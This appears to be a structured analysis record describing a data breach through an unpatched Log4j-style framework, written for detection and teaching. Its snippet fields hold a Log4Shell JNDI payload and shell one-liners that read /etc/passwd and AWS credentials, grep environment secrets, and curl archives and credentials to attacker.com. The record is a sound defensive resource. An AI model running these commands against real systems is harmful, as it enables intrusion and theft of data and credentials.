package_info.package_versions: Known, high-severity vulnerable version (e.g., pre-patch Log4j)
package_info.why_malicious: The package contains a known, high-severity vulnerability that was not patched. Attackers exploited this vulnerability to gain unauthorized access, exfiltrate sensitive data, and maintain persistence within the environment. The use of this vulnerable component in production systems without remediation enabled a catastrophic data breach.

execution_context.file_location: core application code (via vulnerable open source framework)

malicious_snippets.code_snippet: Attacker sends a specially crafted payload to the application, exploiting the vulnerable framework (e.g., Log4Shell: ${jndi:ldap://attacker.com/a})
malicious_snippets.code_language: varies (Java for Log4j, could be others)
malicious_snippets.code_behavior: At runtime, the application processes attacker-controlled input, which triggers the vulnerable framework to perform remote code execution, allowing the attacker to run arbitrary commands, access environment variables, and exfiltrate sensitive data.

malice_analysis.why_suspicious: The code path allows untrusted user input to be interpreted as executable instructions, enabling remote code execution and data exfiltration.
malice_analysis.violated_expectations: Normal frameworks should not allow user input to trigger code execution or access sensitive data. This behavior is a direct violation of secure coding practices.
malice_analysis.similar_legitimate_use: JNDI lookups or dynamic code execution may be used in legitimate enterprise applications, but never with untrusted user input.
key_indicators: Processing of attacker-controlled input as code
Access to sensitive environment variables and files

malicious_snippets.code_snippet: Attacker uses remote shell to enumerate and exfiltrate files: e.g., cat /etc/passwd; tar czf /tmp/data.tar.gz /customer_data; curl -F 'file=@/tmp/data.tar.gz' https://attacker.com/upload
malicious_snippets.code_behavior: After gaining code execution, the attacker enumerates sensitive files, archives customer data, and exfiltrates it to an external server.

malice_analysis.why_suspicious: Unusual file access and outbound network connections to untrusted domains are strong indicators of compromise.
malice_analysis.violated_expectations: Normal application behavior should not include arbitrary file reads or outbound data transfers to unknown servers.
malice_analysis.similar_legitimate_use: Backup scripts may archive and transfer data, but only to trusted, internal destinations.
key_indicators: Outbound network connections to external, non-corporate domains
Use of command-line tools for data exfiltration

malicious_snippets.code_snippet: Attacker enumerates credentials: e.g., cat ~/.aws/credentials; env | grep SECRET; curl -d 'creds=...' https://attacker.com/creds
malicious_snippets.code_behavior: After gaining code execution, the attacker searches for credentials in environment variables and configuration files, then exfiltrates them to an external server.

malice_analysis.why_suspicious: Harvesting credentials and sending them to external locations is a hallmark of post-exploitation activity.
malice_analysis.violated_expectations: Applications should never transmit internal credentials to untrusted destinations.
malice_analysis.similar_legitimate_use: Automated deployment tools may access credentials, but only for internal use.
key_indicators: Enumeration of environment variables for secrets
Outbound HTTP(S) requests to attacker infrastructure

attack_chain.action: Attacker sends a crafted payload exploiting the vulnerable open source framework, achieving remote code execution.
attack_chain.leads_to: Attacker gains initial access to the environment.

attack_chain.action: Attacker uses remote shell to enumerate and archive sensitive customer data.
Attacker exfiltrates archived data and harvested credentials to external infrastructure.
attack_chain.leads_to: Data breach and compromise of customer information.

behavioral_signatures: Processing of attacker-controlled input as code (e.g., JNDI lookups, eval, exec)
Unexpected outbound network connections from application servers
Access to sensitive files or environment variables at runtime
Archiving and transferring large volumes of data to external destinations
network_indicators: Outbound connections to untrusted or attacker-controlled domains/IPs
HTTP(S) POST requests containing large payloads or credential data
detection_knowledge.how_to_detect: Monitor application logs for evidence of remote code execution via vulnerable components (e.g., JNDI lookups in Log4j). Alert on outbound network connections to unknown domains, especially following suspicious input patterns. Detect unusual file access or archiving activity, particularly involving sensitive data directories. Correlate credential access and exfiltration attempts with network activity to external endpoints.
